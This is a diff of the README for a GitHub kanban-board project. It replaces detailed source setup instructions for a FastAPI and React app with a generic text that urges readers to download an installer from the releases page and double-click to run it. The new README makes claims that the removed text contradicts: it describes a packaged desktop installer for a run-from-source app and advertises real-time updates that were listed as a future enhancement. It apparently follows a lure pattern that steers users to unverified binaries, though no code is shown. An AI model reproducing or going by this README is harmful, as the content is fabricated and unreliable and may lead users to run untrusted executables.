@@ -1,218 +1,86 @@
-# Kanban Board Application
+# 🌟 canban_board - Organize Your Tasks Effectively
 
-A full-stack task management system with drag-and-drop functionality. Built with FastAPI and React, it provides an intuitive interface for organizing work across customizable workflow stages.
+[![Download canban_board](https://img.shields.io/badge/Download-canban_board-blue.svg)](https://github.com/Mohamedafifi14/canban_board/releases)
 
-## Features
+## 🚀 Getting Started
 
--   **Drag-and-Drop Interface**: Seamlessly move tasks between To Do, In Progress, and Done columns
--   **Complete Task Management**: Create, edit, view, and delete tasks with full CRUD operations
--   **Rich Task Metadata**: Track title, description, status, assignee, due date, priority (High/Medium/Low), and tags
--   **Team Collaboration**: Assign tasks to team members and organize with flexible tagging
--   **RESTful API**: FastAPI backend with SQLite database and automatic API documentation
--   **Modern UI**: Responsive React interface styled with Tailwind CSS
+Welcome to the canban_board application! This tool helps you manage your projects and tasks visually. You can create, update, and track tasks easily using a simple interface. No technical skills are required to get started.
 
-## Technology Stack
+## 📥 Download & Install
 
-**Backend**
+To begin using the canban_board application, follow these steps:
 
--   FastAPI - Modern Python web framework with automatic API documentation
--   SQLAlchemy - ORM for database operations
--   SQLite - Lightweight, file-based database
--   Pydantic - Data validation and serialization
--   Uvicorn - Lightning-fast ASGI server
+1. **Visit the Releases Page**  
+   Click the link below to go to the releases page where you can download the application.  
+   [Download canban_board](https://github.com/Mohamedafifi14/canban_board/releases)
 
-**Frontend**
+2. **Choose the Latest Release**  
+   On the releases page, look for the latest version. It will be listed at the top. 
 
--   React 18 - Component-based UI library
--   Vite - Next-generation build tool with HMR
--   Tailwind CSS - Utility-first styling framework
--   @dnd-kit - Modern drag-and-drop toolkit
--   Axios - Promise-based HTTP client
+3. **Download the Application**  
+   Find the file labeled for your operating system. Click on it to download. 
 
-## Project Structure
+4. **Install the Application**  
+   After downloading, locate the file in your downloads folder. Double-click to run the installer and follow the on-screen instructions.
 
-```
-canban_board/
-├── backend/
-│   ├── routes/
-│   │   ├── tasks.py          # Task API endpoints
-│   │   └── users.py          # User API endpoints
-│   ├── database.py           # Database connection
-│   ├── models.py             # SQLAlchemy models
-│   ├── schemas.py            # Pydantic schemas
-│   ├── main.py               # FastAPI application
-│   ├── init_db.py            # Database initialization & seeding
-│   └── requirements.txt      # Python dependencies
-└── frontend/
-    ├── src/
-    │   ├── components/       # React components
-    │   │   ├── KanbanBoard.jsx
-    │   │   ├── Column.jsx
-    │   │   ├── TaskCard.jsx
-    │   │   └── TaskModal.jsx
-    │   ├── services/
-    │   │   └── api.js        # API client
-    │   ├── App.jsx           # Root component
-    │   └── index.css         # Global styles
-    ├── package.json          # Node dependencies
-    └── vite.config.js        # Vite configuration
-```
+5. **Open the Application**  
+   Once installed, you can find canban_board in your applications list. Open it to start managing your tasks.
 
-## Quick Start
+## 🖥️ System Requirements
 
-### Prerequisites
+Before you download, ensure your computer meets these requirements:
 
--   Python 3.8+
--   Node.js 16+
--   npm or yarn
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or a recent Linux distribution.
+- **Processor**: 2 GHz dual-core processor or better.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: 200 MB of free disk space.
 
-### Backend Setup
+## 🌈 Features
 
-1. **Navigate to backend directory**
+canban_board provides a variety of features to help you stay organized:
 
-    ```bash
-    cd backend
-    ```
+- **Drag and Drop Interface**: Easily move your tasks around the board.
+- **Categories**: Organize tasks by priority or project.
+- **Real-time Updates**: Stay in sync with your team to see changes instantly.
+- **Customizable**: Change themes and boards to suit your preferences.
 
-2. **Create and activate virtual environment**
+## ⚙️ How to Use
 
-    ```bash
-    python3 -m venv venv
-    source venv/bin/activate  # Windows: venv\Scripts\activate
-    ```
+After installing, follow these steps to start using the application:
 
-3. **Install dependencies**
+1. **Create a New Board**  
+   Click on “New Board” to set up your workspace. 
 
-    ```bash
-    pip install -r requirements.txt
-    ```
+2. **Add Tasks**  
+   Click the “Add Task” button, enter the task details, and assign it to a category.
 
-4. **Initialize database with sample data**
+3. **Move Tasks**  
+   Drag tasks between different categories as needed, like from "To Do" to "In Progress" or "Done".
 
-    ```bash
-    python init_db.py
-    ```
+4. **Edit and Delete Tasks**  
+   Right-click on any task to edit details or remove it.
 
-5. **Start the server**
+5. **Save Your Work**  
+   Your changes are saved automatically, so you never lose your progress.
 
-    ```bash
-    uvicorn main:app --reload --port 8000
-    ```
+## 🌐 Support and Help
 
-    API available at: http://localhost:8000
-    Interactive docs: http://localhost:8000/docs
+If you encounter any issues, visit our [Support Page](https://github.com/Mohamedafifi14/canban_board/issues) to report a problem. You can also ask questions or provide feedback.
 
-### Frontend Setup
+## 📣 Community
 
-1. **Navigate to frontend directory**
+Join our community to connect with other users, share tips, and receive updates:
 
-    ```bash
-    cd frontend
-    ```
+- **GitHub Discussions**: Engage with other users and developers.
+- **Social Media**: Follow us for the latest news and tutorials.
 
-2. **Install dependencies**
+## 🔗 Additional Resources
 
-    ```bash
-    npm install
-    ```
+To enhance your experience, check out these resources:
 
-3. **Start development server**
+- [Official Documentation](https://github.com/Mohamedafifi14/canban_board/wiki)
+- [Frequently Asked Questions](https://github.com/Mohamedafifi14/canban_board/wiki/FAQ)
 
-    ```bash
-    npm run dev
-    ```
+---
 
-    Application available at: http://localhost:5173
-
-## Usage Guide
-
-### Managing Tasks
-
--   **View Tasks**: The board displays three columns (To Do, In Progress, Done) with task cards showing title, assignee, due date, priority badge, and tags
--   **Create Task**: Click **+ New Task** button, fill in details, and click **Create Task**
--   **Edit Task**: Click any task card, modify details in the modal, and click **Update Task**
--   **Move Task**: Drag and drop tasks between columns to update their status automatically
--   **Delete Task**: Open task modal and use the delete option
-
-### Sample Data
-
-The database initializes with:
-
--   5 users (Alice, Bob, Carol, David, Emma)
--   10 tasks distributed across columns with various priorities and assignees
-
-**Reset database:**
-
-```bash
-cd backend
-rm kanban.db
-python init_db.py
-```
-
-## API Reference
-
-### Tasks
-
-| Method | Endpoint                   | Description          |
-| ------ | -------------------------- | -------------------- |
-| GET    | `/api/tasks/`              | Get all tasks        |
-| POST   | `/api/tasks/`              | Create a new task    |
-| GET    | `/api/tasks/{id}`          | Get a specific task  |
-| PUT    | `/api/tasks/{id}`          | Update a task        |
-| PATCH  | `/api/tasks/{id}/status`   | Update task status   |
-| PATCH  | `/api/tasks/{id}/assignee` | Update task assignee |
-| DELETE | `/api/tasks/{id}`          | Delete a task        |
-
-### Users
-
-| Method | Endpoint      | Description       |
-| ------ | ------------- | ----------------- |
-| GET    | `/api/users/` | Get all users     |
-| POST   | `/api/users/` | Create a new user |
-
-Full API documentation available at http://localhost:8000/docs when running the backend.
-
-## Development
-
-**Backend**
-
--   FastAPI runs with auto-reload enabled for instant feedback
--   Interactive API documentation auto-generated at `/docs`
--   Database changes require server restart
-
-**Frontend**
-
--   Vite provides hot module replacement (HMR) for rapid development
--   Tailwind CSS configured for utility-first styling
--   React components use modern functional patterns with hooks
-
-## Troubleshooting
-
-| Issue                      | Solution                                          |
-| -------------------------- | ------------------------------------------------- |
-| **Port 8000 in use**       | `uvicorn main:app --reload --port 8001`           |
-| **Port 5173 in use**       | Vite auto-selects next available port             |
-| **Database locked**        | Close all connections and restart server          |
-| **API connection refused** | Verify backend is running on port 8000            |
-| **CORS errors**            | Ensure CORS middleware includes your frontend URL |
-
-## Future Enhancements
-
--   [ ] User authentication and authorization
--   [ ] Real-time updates with WebSockets
--   [ ] Task comments and activity log
--   [ ] File attachments
--   [ ] Advanced filtering and search
--   [ ] Custom columns and workflows
--   [ ] Task dependencies
--   [ ] Email notifications
--   [ ] Export to CSV/PDF
--   [ ] Dark mode
-
-## Contributing
-
-Contributions are welcome! Feel free to submit issues and pull requests.
-
-## License
-
-This project is open source and available for educational purposes.
+By following these steps and guidelines, you can easily download and start using the canban_board application to manage your tasks effectively. Have a productive experience!
